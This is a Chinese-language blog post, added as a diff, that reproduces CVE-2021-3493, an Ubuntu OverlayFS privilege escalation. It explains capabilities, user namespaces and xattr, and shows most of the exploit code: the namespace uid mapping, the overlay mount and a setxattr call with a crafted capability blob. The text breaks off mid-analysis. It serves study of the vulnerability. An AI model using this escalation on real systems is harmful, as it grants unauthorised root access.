@@ -1,0 +1,309 @@
+<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>CVE-2021-3493 - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="我复现的第一个 CVE，[font color=&#34;#8470FF&#34;]cheers！[/font] 漏洞信息，patch，pwn"><meta property="og:image" content><meta property="og:title" content="CVE-2021-3493"><meta property="og:description" content="我复现的第一个 CVE，[font color=&#34;#8470FF&#34;]cheers！[/font] 漏洞信息，patch，pwn"><meta property="og:type" content="article"><meta property="og:url" content="https://chujdk.github.io/software-testing/1481.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-07-20T19:24:00+00:00"><meta property="article:modified_time" content="2021-07-20T19:24:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="CVE-2021-3493"><meta name=twitter:description content="我复现的第一个 CVE，[font color=&#34;#8470FF&#34;]cheers！[/font] 漏洞信息，patch，pwn"><script src=https://chujdk.github.io/js/feather.min.js></script>
+<link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
+<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
+<a href=/posts.html>All posts</a>
+<a href=/about.html>About</a>
+<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>CVE-2021-3493</h1><div class=meta>Posted on Jul 20, 2021</div></div><section class=body><p>我复现的第一个 CVE，[font color="#8470FF"]cheers！[/font]</p><p><a href=https://ubuntu.com/security/CVE-2021-3493>漏洞信息</a>，<a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=7c03e2cda4a584cadc398e8f6641ca9988a39d52">patch</a>，<a href="https://www.pwnwiki.org/index.php?title=CVE-2021-3493_linux_kernel_%E7%89%B9%E6%AC%8A%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E">pwnwiki</a></p><p>Ubuntu 所特有的一个权限提升漏洞。</p><h3 id=前置知识>前置知识</h3><h4 id=capabilities>capabilities</h4><p>当普通用户需要做一些 root 权限下才能做的事情时，一种方法是用 sudo 提权，一种方法是使用 suid，比如 passwd 这个程序。但是 suid 给予程序的权限过高，比如 passwd 直接拥有了完整的 root 权限，这就导致一旦 passwd 出现了漏洞，攻击者就可以完全控制目标靶机。Linux 内核在 2.2 版本后引入了 capabilities 机制来切分 root 权限，使得每个线程和文件都可以拥有其需要的一部分 root 权限。</p><p>以文件为例，首先编译一个提权的程序</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;stdio.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;unistd.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;stdint.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>
+</span></span><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#06287e>main</span>()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    setuid(<span style=color:#40a070>0</span>);
+</span></span><span style=display:flex><span>    setgid(<span style=color:#40a070>0</span>);
+</span></span><span style=display:flex><span>    execl(<span style=color:#4070a0>&#34;/bin/bash&#34;</span>, <span style=color:#4070a0>&#34;/bin/bash&#34;</span>, <span style=color:#007020>NULL</span>);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>编译后直接执行</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020># chuj @ ubuntu in ~/ctf/CVE-2021-3493 [15:47:30] 
+</span></span></span><span style=display:flex><span><span style=color:#007020></span><span>$</span> gcc magic.c <span style=color:#666>-</span>o magic
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020># chuj @ ubuntu in ~/ctf/CVE-2021-3493 [15:47:33] 
+</span></span></span><span style=display:flex><span><span style=color:#007020></span><span>$</span> .<span style=color:#666>/</span>magic 
+</span></span><span style=display:flex><span>chuj<span>@</span><span style=color:#002070;font-weight:700>ubuntu</span>:<span style=color:#666>~/</span>ctf<span style=color:#666>/</span>CVE<span style=color:#666>-</span><span style=color:#40a070>2021</span><span style=color:#666>-</span><span style=color:#40a070>3493</span><span>$</span> id
+</span></span><span style=display:flex><span>uid<span style=color:#666>=</span><span style=color:#40a070>1000</span>(chuj) gid<span style=color:#666>=</span><span style=color:#40a070>1000</span>(chuj) groups<span style=color:#666>=</span><span style=color:#40a070>1000</span>(chuj),<span style=color:#40a070>4</span>(adm),<span style=color:#40a070>24</span>(cdrom),<span style=color:#40a070>27</span>(sudo),<span style=color:#40a070>30</span>(dip),<span style=color:#40a070>46</span>(plugdev),<span style=color:#40a070>120</span>(lpadmin),<span style=color:#40a070>131</span>(lxd),<span style=color:#40a070>132</span>(sambashare),<span style=color:#40a070>998</span>(docker)
+</span></span></code></pre></div><p>以普通用户运行，自然是无法成功提权的。然后我们给他加上 CAP_SETUID 和 CAP_SETGID 这两个 capabilities，使用 setcap 即可</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020># chuj @ ubuntu in ~/ctf/CVE-2021-3493 [15:48:48] 
+</span></span></span><span style=display:flex><span><span style=color:#007020></span><span>$</span> sudo setcap cap_setuid,cap_setgid<span style=color:#666>=+</span>eip .<span style=color:#666>/</span>magic
+</span></span><span style=display:flex><span>[sudo] password <span style=color:#007020;font-weight:700>for</span> <span style=color:#002070;font-weight:700>chuj</span>: 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020># chuj @ ubuntu in ~/ctf/CVE-2021-3493 [15:49:10] 
+</span></span></span><span style=display:flex><span><span style=color:#007020></span><span>$</span> .<span style=color:#666>/</span>magic 
+</span></span><span style=display:flex><span>root<span>@</span><span style=color:#002070;font-weight:700>ubuntu</span>:<span style=color:#666>~/</span>ctf<span style=color:#666>/</span>CVE<span style=color:#666>-</span><span style=color:#40a070>2021</span><span style=color:#666>-</span><span style=color:#40a070>3493</span><span>#</span> id
+</span></span><span style=display:flex><span>uid<span style=color:#666>=</span><span style=color:#40a070>0</span>(root) gid<span style=color:#666>=</span><span style=color:#40a070>0</span>(root) groups<span style=color:#666>=</span><span style=color:#40a070>0</span>(root),<span style=color:#40a070>4</span>(adm),<span style=color:#40a070>24</span>(cdrom),<span style=color:#40a070>27</span>(sudo),<span style=color:#40a070>30</span>(dip),<span style=color:#40a070>46</span>(plugdev),<span style=color:#40a070>120</span>(lpadmin),<span style=color:#40a070>131</span>(lxd),<span style=color:#40a070>132</span>(sambashare),<span style=color:#40a070>998</span>(docker),<span style=color:#40a070>1000</span>(chuj)
+</span></span></code></pre></div><p>执行之后，发现成功提权。但是这里需要使用 root 权限才能设置 capabilities，而 CVE-2021-3493 就是利用了在 Ubuntu 下的一个不需要 root 权限就可以设置 capabilities 的漏洞实现的权限提升。</p><h4 id=namespace>namespace</h4><p>namespace 机制是 Linux 提供一个在内核级隔离资源的机制，目前提供了六种资源的隔离</p><ul><li><code>Mount</code>: 隔离文件系统挂载点</li><li><code>UTS</code>: 隔离主机名和域名信息</li><li><code>IPC</code>: 隔离进程间通信</li><li><code>PID</code>: 隔离进程的ID</li><li><code>Network</code>: 隔离网络资源</li><li><code>User</code>: 隔离用户和用户组的ID</li></ul><p>在此 CVE 中，主要利用了 User Namespace 来“伪造”root 用户绕过检测。在 User Namespace 中，使用到了 /proc/$pid/ 文件夹中的 uid_map 和 gid_map 这两个文件来进行 id 的映射，内容为三个数字：<code>first-ns-id first-target-id count</code></p><ul><li>first-ns-id：在新的 namespace 中被映射的 user id</li><li>first-target-id：被映射的 user id</li><li>count：表示映射的范围，为 1 表示只映射一个，大于1表示按顺序映射</li></ul><p>我们建立新的名称空间时，把 first-ns-id 设置为 0，first-target-id 设置为原名称空间中进程的 id，这样就可以在新的名称空间中获得到 root 权限，但是此权限不超过在原名称空间中的权限。举个例子</p><p>建立这样一个新的名称空间</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>uid_t out_uid <span style=color:#666>=</span> getuid();
+</span></span><span style=display:flex><span>        gid_t out_gid <span style=color:#666>=</span> getgid();
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>        unshare(CLONE_NEWNS <span style=color:#666>|</span> CLONE_NEWUSER); <span style=color:#60a0b0;font-style:italic>// create a new namespace
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>
+</span></span><span style=display:flex><span>        write_file(<span style=color:#4070a0>&#34;/proc/self/setgroups&#34;</span>, <span style=color:#4070a0>&#34;deny&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#902000>char</span> buf[<span style=color:#40a070>0x100</span>];
+</span></span><span style=display:flex><span>        sprintf(buf, <span style=color:#4070a0>&#34;0 %d 1&#34;</span>, out_uid);
+</span></span><span style=display:flex><span>        write_file(<span style=color:#4070a0>&#34;/proc/self/uid_map&#34;</span>, buf);
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>        sprintf(buf, <span style=color:#4070a0>&#34;0 %d 1&#34;</span>, out_gid);
+</span></span><span style=display:flex><span>        write_file(<span style=color:#4070a0>&#34;/proc/self/gid_map&#34;</span>, buf);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        execl(<span style=color:#4070a0>&#34;/bin/bash&#34;</span>, <span style=color:#4070a0>&#34;/bin/bash&#34;</span>, <span style=color:#007020>NULL</span>);
+</span></span></code></pre></div><p>执行后</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>root@ubuntu:~/ctf/CVE-2021-3493# id
+</span></span><span style=display:flex><span><span style=color:#bb60d5>uid</span><span style=color:#666>=</span>0<span style=color:#666>(</span>root<span style=color:#666>)</span> <span style=color:#bb60d5>gid</span><span style=color:#666>=</span>0<span style=color:#666>(</span>root<span style=color:#666>)</span> <span style=color:#bb60d5>groups</span><span style=color:#666>=</span>0<span style=color:#666>(</span>root<span style=color:#666>)</span>,65534<span style=color:#666>(</span>nogroup<span style=color:#666>)</span>
+</span></span><span style=display:flex><span>root@ubuntu:~/ctf/CVE-2021-3493# <span style=color:#007020>cd</span> /root
+</span></span><span style=display:flex><span>bash: cd: /root: Permission denied
+</span></span></code></pre></div><p>可以发现虽然 uid 是 0 了，但是仍然无法访问 root 的文件夹。</p><h4 id=overlayfs>OverlayFS</h4><p>可以参考<a href=https://blog.csdn.net/luckyapple1028/article/details/77916194>深入理解overlayfs（一）：初识</a>，写的很详细</p><h4 id=xattr>xattr</h4><p><a href=https://man7.org/linux/man-pages/man7/xattr.7.html>man page</a>。xattr（文件拓展属性）是永久关联到文件和目录的键值，可以让文件系统支持在其原始设计中不支持的功能，使用 setxattr 可以设置拓展属性，getxattr 可以获得拓展属性。通过此函数也可以设置文件的 capabilities</p><h3 id=环境准备>环境准备</h3><p>这个洞不是溢出之类的洞，所以 exp 应该不容易把内核搞 panic 掉，同时也没什么动调的必要，最重要的是我不知道为什么 qemu 起的虚拟机没法复现，所以就直接用宿主虚拟机了。</p><p>看了一下 Ubuntu 的漏洞信息页面，也没看出来具体是在什么时候修复的，Ubuntu 20.04 大概是在镜像版本为 <code>5.8.0-50.56~20.04.1</code> 时修复的，看了一下我的虚拟机</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ uname -a
+</span></span><span style=display:flex><span>Linux ubuntu 5.8.0-61-generic <span style=color:#60a0b0;font-style:italic>#68~20.04.1-Ubuntu SMP Wed Jun 30 10:32:39 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span></code></pre></div><p>版本还是比较高的，所以需要先降级，首先通过 <code>grep menuentry /boot/grub/grub.cfg</code> 来看一下当前能用的内核</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ grep menuentry /boot/grub/grub.cfg
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>if</span> <span style=color:#666>[</span> x<span style=color:#4070a0>&#34;</span><span style=color:#70a0d0>${</span><span style=color:#bb60d5>feature_menuentry_id</span><span style=color:#70a0d0>}</span><span style=color:#4070a0>&#34;</span> <span style=color:#666>=</span> xy <span style=color:#666>]</span>; <span style=color:#007020;font-weight:700>then</span>
+</span></span><span style=display:flex><span>  <span style=color:#bb60d5>menuentry_id_option</span><span style=color:#666>=</span><span style=color:#4070a0>&#34;--id&#34;</span>
+</span></span><span style=display:flex><span>  <span style=color:#bb60d5>menuentry_id_option</span><span style=color:#666>=</span><span style=color:#4070a0>&#34;&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#007020>export</span> menuentry_id_option
+</span></span><span style=display:flex><span>menuentry <span style=color:#4070a0>&#39;Ubuntu&#39;</span> --class ubuntu --class gnu-linux --class gnu --class os <span style=color:#bb60d5>$menuentry_id_option</span> <span style=color:#4070a0>&#39;gnulinux-simple-cb8134cd-0aae-44b6-9e58-cf92d64e9902&#39;</span> <span style=color:#666>{</span>
+</span></span><span style=display:flex><span>submenu <span style=color:#4070a0>&#39;Advanced options for Ubuntu&#39;</span> <span style=color:#bb60d5>$menuentry_id_option</span> <span style=color:#4070a0>&#39;gnulinux-advanced-cb8134cd-0aae-44b6-9e58-cf92d64e9902&#39;</span> <span style=color:#666>{</span>
+</span></span><span style=display:flex><span>        menuentry <span style=color:#4070a0>&#39;Ubuntu, with Linux 5.8.0-61-generic&#39;</span> --class ubuntu --class gnu-linux --class gnu --class os <span style=color:#bb60d5>$menuentry_id_option</span> <span style=color:#4070a0>&#39;gnulinux-5.8.0-61-generic-advanced-cb8134cd-0aae-44b6-9e58-cf92d64e9902&#39;</span> <span style=color:#666>{</span>
+</span></span><span style=display:flex><span>        menuentry <span style=color:#4070a0>&#39;Ubuntu, with Linux 5.8.0-61-generic (recovery mode)&#39;</span> --class ubuntu --class gnu-linux --class gnu --class os <span style=color:#bb60d5>$menuentry_id_option</span> <span style=color:#4070a0>&#39;gnulinux-5.8.0-61-generic-recovery-cb8134cd-0aae-44b6-9e58-cf92d64e9902&#39;</span> <span style=color:#666>{</span>
+</span></span><span style=display:flex><span>        menuentry <span style=color:#4070a0>&#39;Ubuntu, with Linux 5.8.0-59-generic&#39;</span> --class ubuntu --class gnu-linux --class gnu --class os <span style=color:#bb60d5>$menuentry_id_option</span> <span style=color:#4070a0>&#39;gnulinux-5.8.0-59-generic-advanced-cb8134cd-0aae-44b6-9e58-cf92d64e9902&#39;</span> <span style=color:#666>{</span>
+</span></span><span style=display:flex><span>        menuentry <span style=color:#4070a0>&#39;Ubuntu, with Linux 5.8.0-59-generic (recovery mode)&#39;</span> --class ubuntu --class gnu-linux --class gnu --class os <span style=color:#bb60d5>$menuentry_id_option</span> <span style=color:#4070a0>&#39;gnulinux-5.8.0-59-generic-recovery-cb8134cd-0aae-44b6-9e58-cf92d64e9902&#39;</span> <span style=color:#666>{</span>
+</span></span><span style=display:flex><span>        menuentry <span style=color:#4070a0>&#39;Ubuntu, with Linux 5.8.0-43-generic&#39;</span> --class ubuntu --class gnu-linux --class gnu --class os <span style=color:#bb60d5>$menuentry_id_option</span> <span style=color:#4070a0>&#39;gnulinux-5.8.0-43-generic-advanced-cb8134cd-0aae-44b6-9e58-cf92d64e9902&#39;</span> <span style=color:#666>{</span>
+</span></span><span style=display:flex><span>        menuentry <span style=color:#4070a0>&#39;Ubuntu, with Linux 5.8.0-43-generic (recovery mode)&#39;</span> --class ubuntu --class gnu-linux --class gnu --class os <span style=color:#bb60d5>$menuentry_id_option</span> <span style=color:#4070a0>&#39;gnulinux-5.8.0-43-generic-recovery-cb8134cd-0aae-44b6-9e58-cf92d64e9902&#39;</span> <span style=color:#666>{</span>
+</span></span><span style=display:flex><span>menuentry <span style=color:#4070a0>&#39;Memory test (memtest86+)&#39;</span> <span style=color:#666>{</span>
+</span></span><span style=display:flex><span>menuentry <span style=color:#4070a0>&#39;Memory test (memtest86+, serial console 115200)&#39;</span> <span style=color:#666>{</span>
+</span></span></code></pre></div><p>如果没有符合条件的内核，可以通过 apt 安装，执行 <code>sudo apt search linux-image | grep 5.8.0</code> 就可以出来一堆，随便找一个低版本的就可以了，比如我选择 <code>linux-image-5.8.0-43-generic</code>，那么如下操作</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>sudo apt install linux-headers-5.8.0-43-generic linux-image-5.8.0-43-generic
+</span></span></code></pre></div><p>就可以安装上了。</p><p>然后修改一下 grub</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>sudo vim /etc/default/grub
+</span></span></code></pre></div><p>修改其中的 GRUB_DEFAULT 项，在我的虚拟机中，该项默认值为 0，这里修改为</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#bb60d5>GRUB_DEFAULT</span><span style=color:#666>=</span><span style=color:#4070a0>&#34;gnulinux-advanced-cb8134cd-0aae-44b6-9e58-cf92d64e9902&gt;gnulinux-5.8.0-43-generic-advanced-cb8134cd-0aae-44b6-9e58-cf92d64e9902&#34;</span>
+</span></span></code></pre></div><p>这些信息通过 <code>grep menuentry /boot/grub/grub.cfg</code> 都可以找到，然后更新 grub 再重启就可以了</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>sudo update-grub
+</span></span><span style=display:flex><span>sudo reboot
+</span></span></code></pre></div><h3 id=漏洞分析>漏洞分析</h3><p>我们首先构造一个沙盒，在其中先提权到 root 权限，如下</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>mkdir(<span style=color:#4070a0>&#34;./exploit&#34;</span>, <span style=color:#40a070>0777</span>);
+</span></span><span style=display:flex><span>        mkdir(<span style=color:#4070a0>&#34;./exploit/upper&#34;</span>, <span style=color:#40a070>0777</span>);
+</span></span><span style=display:flex><span>        mkdir(<span style=color:#4070a0>&#34;./exploit/lower&#34;</span>, <span style=color:#40a070>0777</span>);
+</span></span><span style=display:flex><span>        mkdir(<span style=color:#4070a0>&#34;./exploit/work&#34;</span>, <span style=color:#40a070>0777</span>);
+</span></span><span style=display:flex><span>        mkdir(<span style=color:#4070a0>&#34;./exploit/merge&#34;</span>, <span style=color:#40a070>0777</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        uid_t out_uid <span style=color:#666>=</span> getuid();
+</span></span><span style=display:flex><span>        gid_t out_gid <span style=color:#666>=</span> getgid();
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>        unshare(CLONE_NEWNS <span style=color:#666>|</span> CLONE_NEWUSER); <span style=color:#60a0b0;font-style:italic>// create a new namespace
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>
+</span></span><span style=display:flex><span>        write_file(<span style=color:#4070a0>&#34;/proc/self/setgroups&#34;</span>, <span style=color:#4070a0>&#34;deny&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#902000>char</span> buf[<span style=color:#40a070>0x100</span>];
+</span></span><span style=display:flex><span>        sprintf(buf, <span style=color:#4070a0>&#34;0 %d 1&#34;</span>, out_uid);
+</span></span><span style=display:flex><span>        write_file(<span style=color:#4070a0>&#34;/proc/self/uid_map&#34;</span>, buf);
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>        sprintf(buf, <span style=color:#4070a0>&#34;0 %d 1&#34;</span>, out_gid);
+</span></span><span style=display:flex><span>        write_file(<span style=color:#4070a0>&#34;/proc/self/gid_map&#34;</span>, buf);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        mount(<span style=color:#4070a0>&#34;overlay&#34;</span>, <span style=color:#4070a0>&#34;./exploit/merge&#34;</span>, <span style=color:#4070a0>&#34;overlay&#34;</span>, <span style=color:#40a070>0</span>, \
+</span></span><span style=display:flex><span>        <span style=color:#4070a0>&#34;lowerdir=./exploit/lower,upperdir=./exploit/upper,workdir=./exploit/work&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#902000>char</span> cap[] <span style=color:#666>=</span> \
+</span></span><span style=display:flex><span>        <span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00</span><span style=color:#4070a0>&#34;</span>;
+</span></span><span style=display:flex><span>        copy_file(<span style=color:#4070a0>&#34;/proc/self/exe&#34;</span>, <span style=color:#4070a0>&#34;./exploit/merge/get_root&#34;</span>);
+</span></span><span style=display:flex><span>        setxattr(<span style=color:#4070a0>&#34;./exploit/merge/get_root&#34;</span>, <span style=color:#4070a0>&#34;security.capability&#34;</span>, cap, <span style=color:#007020;font-weight:700>sizeof</span>(cap) <span style=color:#666>-</span> <span style=color:#40a070>1</span>, <span style=color:#40a070>0</span>);
+</span></span></code></pre></div><p>这样我们就可以在新建立的 namespace 中获得 root 权限，并且挂载一个 overlayfs 到 <code>./exploit/merge</code> 目录下。此时我们无法仍然无法执行超过原先普通用户权限的操作，但是在新的名称空间中，我们已经拥有了 root 权限。这个沙盒的示意图如下</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/07/1929214024.png></div><p>然后我们在 <code>./exploit/merge</code> 中创建一个会通过 setuid setgid 提权的程序，这里通过拷贝自身来实现。拷贝自身后的示意图为</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/07/2099839026.png></div><p>而漏洞主要出现在 setxattr 函数的调用链中，在设置 xattr 时的权限检测不全面，导致了非 root 用户也可以设置文件的 capabilities。</p><p>setxattr 函数的实现为</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>long</span>
+</span></span><span style=display:flex><span><span style=color:#06287e>setxattr</span>(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>dentry</span> <span style=color:#666>*</span>d, <span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span> __user <span style=color:#666>*</span>name, <span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>void</span> __user <span style=color:#666>*</span>value,
+</span></span><span style=display:flex><span>	 size_t size, <span style=color:#902000>int</span> flags)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> error;
+</span></span><span style=display:flex><span>	<span style=color:#902000>void</span> <span style=color:#666>*</span>kvalue <span style=color:#666>=</span> <span style=color:#007020>NULL</span>;
+</span></span><span style=display:flex><span>	<span style=color:#902000>char</span> kname[XATTR_NAME_MAX <span style=color:#666>+</span> <span style=color:#40a070>1</span>];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (flags <span style=color:#666>&amp;</span> <span style=color:#666>~</span>(XATTR_CREATE<span style=color:#666>|</span>XATTR_REPLACE))
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span>EINVAL;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	error <span style=color:#666>=</span> strncpy_from_user(kname, name, <span style=color:#007020;font-weight:700>sizeof</span>(kname));
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (error <span style=color:#666>==</span> <span style=color:#40a070>0</span> <span style=color:#666>||</span> error <span style=color:#666>==</span> <span style=color:#007020;font-weight:700>sizeof</span>(kname))
+</span></span><span style=display:flex><span>		error <span style=color:#666>=</span> <span style=color:#666>-</span>ERANGE;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (error <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>return</span> error;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (size) {
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>if</span> (size <span style=color:#666>&gt;</span> XATTR_SIZE_MAX)
+</span></span><span style=display:flex><span>			<span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span>E2BIG;
+</span></span><span style=display:flex><span>		kvalue <span style=color:#666>=</span> kvmalloc(size, GFP_KERNEL);
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>!</span>kvalue)
+</span></span><span style=display:flex><span>			<span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span>ENOMEM;
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>if</span> (copy_from_user(kvalue, value, size)) {
+</span></span><span style=display:flex><span>			error <span style=color:#666>=</span> <span style=color:#666>-</span>EFAULT;
+</span></span><span style=display:flex><span>			<span style=color:#007020;font-weight:700>goto</span> out;
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>if</span> ((strcmp(kname, XATTR_NAME_POSIX_ACL_ACCESS) <span style=color:#666>==</span> <span style=color:#40a070>0</span>) <span style=color:#666>||</span>
+</span></span><span style=display:flex><span>		    (strcmp(kname, XATTR_NAME_POSIX_ACL_DEFAULT) <span style=color:#666>==</span> <span style=color:#40a070>0</span>))
+</span></span><span style=display:flex><span>			posix_acl_fix_xattr_from_user(kvalue, size);
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>else</span> <span style=color:#007020;font-weight:700>if</span> (strcmp(kname, XATTR_NAME_CAPS) <span style=color:#666>==</span> <span style=color:#40a070>0</span>) {
+</span></span><span style=display:flex><span>			error <span style=color:#666>=</span> cap_convert_nscap(d, <span style=color:#666>&amp;</span>kvalue, size);
+</span></span><span style=display:flex><span>			<span style=color:#007020;font-weight:700>if</span> (error <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>				<span style=color:#007020;font-weight:700>goto</span> out;
+</span></span><span style=display:flex><span>			size <span style=color:#666>=</span> error;
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	error <span style=color:#666>=</span> vfs_setxattr(d, kname, kvalue, size, flags);
+</span></span><span style=display:flex><span><span style=color:#002070;font-weight:700>out</span>:
+</span></span><span style=display:flex><span>	kvfree(kvalue);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>return</span> error;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>我们利用时的调用将会是</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>setxattr(<span style=color:#4070a0>&#34;./exploit/merge/get_root&#34;</span>, <span style=color:#4070a0>&#34;security.capability&#34;</span>, cap, <span style=color:#007020;font-weight:700>sizeof</span>(cap) <span style=color:#666>-</span> <span style=color:#40a070>1</span>, <span style=color:#40a070>0</span>);
